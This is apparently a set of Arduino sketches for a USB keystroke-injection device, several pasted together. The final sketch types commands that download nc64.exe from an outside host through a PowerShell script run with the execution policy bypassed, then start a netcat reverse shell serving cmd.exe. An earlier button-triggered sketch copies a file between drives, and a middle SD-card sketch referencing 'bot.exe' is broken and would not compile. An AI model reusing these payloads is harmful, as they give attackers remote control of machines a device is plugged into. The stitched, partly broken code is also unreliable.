#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

const int buttonPin = A2;     // the number of the pushbutton pin
const int ledPin =  A3;      // the number of the LED pin

// variables will change:
int buttonState = 0;         // variable for reading the pushbutton status

void setup() {
  // initialize the LED pin as an output:
  pinMode(ledPin, OUTPUT);
  // initialize the pushbutton pin as an input:
  pinMode(buttonPin, INPUT);
}

void loop() {
  // read the state of the pushbutton value:
  buttonState = digitalRead(buttonPin);

  // check if the pushbutton is pressed. If it is, the buttonState is HIGH:
  if (buttonState == HIGH) {
    // turn LED on:
    digitalWrite(ledPin, HIGH);
    // Begining the Keyboard stream
    Keyboard.begin();
    delay(120);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(120);
    Keyboard.print(F("cmd"));
    typeKey(KEY_RETURN);
    delay(120);
    Keyboard.print(F("cd D:"));
    typeKey(KEY_RETURN);
    delay(120);
    Keyboard.print(F("D:"));
    typeKey(KEY_RETURN);
    delay(120);
    Keyboard.print(F("copy 1.txt E:"));
    typeKey(KEY_RETURN);
    delay(120);
    Keyboard.print(F("exit()"));
    typeKey(KEY_RETURN);
  } else {
    // turn LED off:
    digitalWrite(ledPin, LOW);
  }
}

















//SD CARD

const int SDselect = A4;
const int buttonPin = A2;     // the number of the pushbutton pin
const int ledPin =  A3;      // the number of the LED pin

// variables will change:
int buttonState = 0;         // variable for reading the pushbutton status

#include <SPI.h>
#include <SD.h>
File myFile;
void setup() {
  // Open serial communications and wait for port to open:
  Serial.begin(9600);
  while (!Serial) {
  ; // wait for serial port to connect. Needed for native USB port only
  }
  Serial.print("Initializing SD card...");
  if (!SD.begin(10)) {
    Serial.println("initialization failed!");
  while (1);
  }
  Serial.println("initialization done.");
  // open the file. note that only one file can be open at a time,
  // so you have to close this one before opening another.
  myFile = SD.open("bot.exe");
  Serial.println("done.");
  } else {
  // if the file didn't open, print an error:
  Serial.println("error opening test.txt");
  }
}
void loop() {
// nothing happens after setup
}













/**
 * Made with Duckuino, an open-source project.
 * Check the license at 'https://github.com/Nurrl/Duckuino/blob/master/LICENSE'
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(300);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(400);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(300);
  Keyboard.print(F("cmd"));

  typeKey(KEY_RETURN);

  delay(300);
  Keyboard.print(F("cd / & mkdir win & cd win & echo (wget 'http://artacyber.persiangig.com/.3HZAOFaX5J/nc64.exe' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1"));

  typeKey(KEY_RETURN);
  delay(300);
  
  Keyboard.print(F("START /MIN a.exe 172.16.0.174 54321 -e cmd.exe -d & exit"));

  typeKey(KEY_RETURN);
  
  //delay(300);
  //Keyboard.print(F("cd .."));
//  typeKey(KEY_RETURN);
  
 // delay(10000);
 // Keyboard.print(F("attrib +h +s win & exit"));
 // typeKey(KEY_RETURN);
  

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
